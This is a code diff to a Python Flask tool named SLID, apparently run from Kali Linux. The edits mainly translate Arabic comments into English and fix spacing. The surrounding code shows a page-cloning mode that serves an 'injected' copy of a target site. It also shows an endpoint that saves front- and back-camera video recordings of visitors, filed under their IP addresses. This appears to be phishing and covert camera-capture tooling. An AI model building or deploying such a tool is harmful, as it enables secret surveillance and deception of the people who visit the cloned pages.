@@ -10,7 +10,7 @@ import logging
 from colorama import init, Fore, Style
 from time import sleep
 import requests
-from bs4 import BeautifulSoup 
+from bs4 import BeautifulSoup
 
 # Initialize colorama for cross-platform terminal colors
 init(autoreset=True)
@@ -28,8 +28,8 @@ DATA_LOG_FILE = '/home/kali/Desktop/slid/result.csv'
 STATIC_FOLDER = 'static'
 HOST = '0.0.0.0'
 PORT = 8080
-SAVE_PATH_VIDEO_FRONT = "/home/kali/Desktop/slid/vido_fortend/" # هذا هو المجلد الأمامي
-SAVE_PATH_VIDEO_BACK = "/home/kali/Desktop/slid/vidio_backend/" # هذا هو المجلد الخلفي
+SAVE_PATH_VIDEO_FRONT = "/home/kali/Desktop/slid/vido_fortend/" # This is the front folder
+SAVE_PATH_VIDEO_BACK = "/home/kali/Desktop/slid/vidio_backend/" # This is the back folder
 
 # Global variables
 app.config['MODE'] = None # normal, spam, or clone
@@ -107,7 +107,7 @@ def index():
         return "Error: Tool mode not set. Please run tool.py from CLI.", 500
     
     if app.config['MODE'] == 'clone':
-        # تقديم الملف المحقون مباشرة
+        # Serve the injected file directly
         return render_template('clone_template.html')
         
     return render_template('index.html')
@@ -232,7 +232,7 @@ def capture_video():
 
         original_filename = video_file.filename
         
-        # 🌟🌟🌟 التعديل هنا: يتم البحث عن 'user' أو 'environment' 🌟🌟🌟
+        # 🌟🌟🌟 Adjustment here: searching for 'user' or 'environment' 🌟🌟🌟
         camera_type_match = re.search(r'recording_(user|environment)\.webm', original_filename)
         camera_type = camera_type_match.group(1) if camera_type_match else 'unknown'
 
@@ -241,7 +241,7 @@ def capture_video():
         elif camera_type == 'environment':
             save_dir = SAVE_PATH_VIDEO_BACK
         else:
-            save_dir = SAVE_PATH_VIDEO_FRONT # الافتراضي هو مجلد الكاميرا الأمامية 
+            save_dir = SAVE_PATH_VIDEO_FRONT # Default is the front camera folder
 
         if not os.path.exists(save_dir):
             try: os.makedirs(save_dir, exist_ok=True)
@@ -250,7 +250,7 @@ def capture_video():
                 return jsonify({"status": "error", "message": "Server path error"}), 500
 
         public_ip = request.headers.get('X-Forwarded-For', request.remote_addr).replace('.', '_')
-        # تم تحديث اسم الملف ليحتوي على 'user' أو 'environment'
+        # Filename updated to include 'user' or 'environment'
         filename = f"video_{camera_type}_{public_ip}_{int(time.time())}.webm" 
         file_path = os.path.join(save_dir, filename)
         
@@ -478,7 +478,7 @@ def start_local_clone():
         
     except requests.exceptions.RequestException as e:
         print(Fore.RED + f"\n[ERROR] Failed to fetch or process URL: {e}" + Style.RESET_ALL)
-        print(Fore.RED + "          The server will start, but the cloned page may be empty or failed." + Style.RESET_ALL)
+        print(Fore.RED + "            The server will start, but the cloned page may be empty or failed." + Style.RESET_ALL)
         # We must create an empty/failed template to prevent server crash
         with open(os.path.join('templates', 'clone_template.html'), 'w', encoding='utf-8') as f:
             f.write(f"<h1>Error Cloning Page</h1><p>Failed to access {app.config['CLONE_TARGET_URL']}. Check your network connection and the URL.</p>")
@@ -527,7 +527,7 @@ def run_server():
     SEPARATOR = Fore.BLUE + "=" * 70 + Style.RESET_ALL
     
     print(SEPARATOR)
-    print(Fore.YELLOW + Style.BRIGHT + "            ⚡️ SLID IS ACTIVE AND AWAITING CONNECTION ⚡️" + Style.RESET_ALL)
+    print(Fore.YELLOW + Style.BRIGHT + "              ⚡️ SLID IS ACTIVE AND AWAITING CONNECTION ⚡️" + Style.RESET_ALL)
     print(SEPARATOR)
     
     # Target Information 
